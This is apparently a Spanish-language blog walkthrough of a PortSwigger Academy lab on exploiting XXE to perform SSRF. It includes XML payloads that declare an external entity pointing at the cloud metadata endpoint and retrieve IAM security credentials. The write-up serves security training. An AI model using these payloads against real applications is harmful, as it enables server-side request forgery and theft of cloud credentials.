+++
author = "Alux"
title = "Portswigger Academy Learning Path: XML external entity (XXE) Lab 2"
date = "2022-01-23"
description = "Lab: Exploiting XXE to perform SSRF attacks"
tags = [
    "xxe",
    "portswigger",
    "academy",
    "burpsuite",
]
categories = [
    "pentest web",
]
series = ["Portswigger Labs"]
image = "head.png"
+++

# Lab: Exploiting XXE to perform SSRF attacks

La vulnerabilidad o el ataque de XXE es poder realizar una inyeccion XML en la aplicacion que analiza la entrada que le pasa el usuario o el sistema. Lo que hace que un analizados XML no este configuracion o este configurado debilmente para que procese peticiones que un usuario mal intencionado pueda inyectar. Pudiendo llegar a ejecucion de comandos, lectura de archivos y otros.

![Proceso de XXE](xxe-injection.svg)


## Reconocimiento

En este <cite>laboratorio[^1]</cite>la finalidad es poder realizar un ataque de SSRF valiendose de la inyeccion XXE valiendose de la configuracion debil del analizador.

Primero notamos la opcion de `Check stock` de la web en la que recuperamos la existencia de los productos.

![Check stock](checkstock.png)

Al ir a la opcion de `Check stock` en burp vemos la peticion que se hace al servidor usando lenguaje XML para realizar la peticion.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
<productId>1</productId>
<storeId>1</storeId>
</stockCheck>
```

![Peticion para recuperar el stock del producto](request1.png)

## Explotacion

Sabiendo la peticion que se hace lo primero que haremos sera recuperar el archivo que contiene la key del EC2 esto a traves de declarar la DTD para luego referenciar la entidad a nuestro archivo que queremos leer. Que es con la siguiente sintaxis. Luego se referencia en cualquiera del valor que se imprimira o recibira de la web que sera `productId` referenciando con `&xxe;`. Si no realizamos este proceso no podremos recuperar los datos. ESta se encuentra en la ip `http://169.254.169.254/`.

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/path/to/key"> ]>
```

Ahora enviamos la peticion y como podemos notar cada una de las peticiones nos ira dando las rutas para el siguiente path y asi recuperar la key.

![Peticion 1 para solicitar la key a un equipo interno](request2.png)
![Peticion 2 para solicitar la key a un equipo interno](request3.png)
![Peticion 3 para solicitar la key a un equipo interno](request4.png)
![Peticion 4 para solicitar la key a un equipo interno](request5.png)
![Peticion 5 para solicitar la key a un equipo interno](request6.png)


Finalmente encontramos la ultima peticion en la cual se encuentra la key

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
<productId>&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```

![Peticion 6 para solicitar la key a un equipo interno](request7.png)

Y con esto hemos resuelto el lab.

![Laboratorio resuelto](resuelto.png)


[^1]: [Laboratorio](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)